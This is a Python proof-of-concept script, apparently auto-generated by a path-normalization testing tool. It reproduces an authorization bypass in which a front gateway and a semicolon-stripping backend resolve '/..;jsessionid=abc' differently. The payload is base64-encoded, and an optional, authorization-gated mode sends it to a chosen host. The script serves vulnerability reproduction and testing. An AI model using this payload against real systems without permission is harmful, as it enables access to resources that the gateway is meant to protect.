#!/usr/bin/env python3
"""鉴权绕过（路径归一化不一致）

由 CED 自动生成 —— 用例 38bfc231，场景 authz，领域 url-norm。
零第三方依赖；放在仓库任意位置都能跑（脚本会自己往上找仓库根目录）。

    python poc_38bfc231.py                      # 离线：算清量化指标（默认，不联网）
    python poc_38bfc231.py --send HOST:PORT --i-am-authorized
                                            # 真的把最小复现样本发出去（仅限已授权目标）

合规：--send 必须同时给出 --i-am-authorized。只对自有或已授权的目标使用。
"""
from __future__ import annotations

import argparse
import base64
import socket
import sys
from pathlib import Path


def _find_root() -> Path:
    """往上找带 ced/__init__.py 的目录 —— 脚本被挪到哪儿都能跑。"""
    here = Path(__file__).resolve()
    for parent in here.parents:
        if (parent / "ced" / "__init__.py").is_file():
            return parent
    return here.parent


ROOT = _find_root()
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from ced.impls import url_reference
from ced.impls.path_norm import normalize_target

CASE_ID = '38bfc231'
FRONT = 'url-gateway'
BACK = 'url-strip-semicolon'
PAYLOAD = base64.b64decode('Ly4uO2pzZXNzaW9uaWQ9YWJj')
EXPECT = ('/..;jsessionid=abc', '/')


def measure():
    """按两侧的策略算出量化指标。算不出来返回 None。"""
    try:
        front_policy = url_reference.policy_of(FRONT)
        back_policy = url_reference.policy_of(BACK)
    except KeyError:
        return None
    front_res = normalize_target(PAYLOAD, front_policy)
    forwarded = PAYLOAD
    if front_policy.forward_form == "normalized":
        forwarded = front_res.norm_path.encode("latin-1")
    back_res = normalize_target(forwarded, back_policy)
    return front_res.norm_path, back_res.norm_path


def main() -> int:
    ap = argparse.ArgumentParser(description="CED 生成的复现脚本")
    ap.add_argument("--send", metavar="HOST:PORT",
                    help="把最小复现样本真的发到这个地址（前置入口）")
    ap.add_argument("--i-am-authorized", action="store_true",
                    help="确认对 --send 的目标已获授权；缺此项则拒绝发送")
    args = ap.parse_args()

    print(f"用例        {CASE_ID}")
    print(f"链路        {FRONT} → {BACK}")
    print(f"样本长度    {len(PAYLOAD)} 字节")

    got = measure()
    ok = got is not None
    if got is None:
        print("量化        无法计算（两侧含非本地实现）—— 请在真实拓扑上复现")
    else:
        front_path, back_path = got
        print(f"前置认的资源  {front_path}")
        print(f"后端认的资源  {back_path}")
        print(f"资源错位      {'是' if front_path != back_path else '否'}")
        ok = (front_path != back_path) == bool(EXPECT[0])
        expect_mismatch = EXPECT[0] != EXPECT[1]
        print(f"断言        {'PASS' if ok else 'FAIL'}"
              f"（期望错位={expect_mismatch}）")

    if args.send:
        if not args.i_am_authorized:
            print("拒绝发送：--send 需要同时给出 --i-am-authorized"
                  "（只对自有或已授权目标使用）。")
            return 2
        host, _, port = args.send.rpartition(":")
        with socket.create_connection((host or "127.0.0.1", int(port)), timeout=10) as sock:
            sock.sendall(PAYLOAD)
            sock.shutdown(socket.SHUT_WR)
            response = b""
            while True:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                response += chunk
        print(f"已发送      {args.send}，收到 {len(response)} 字节响应")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
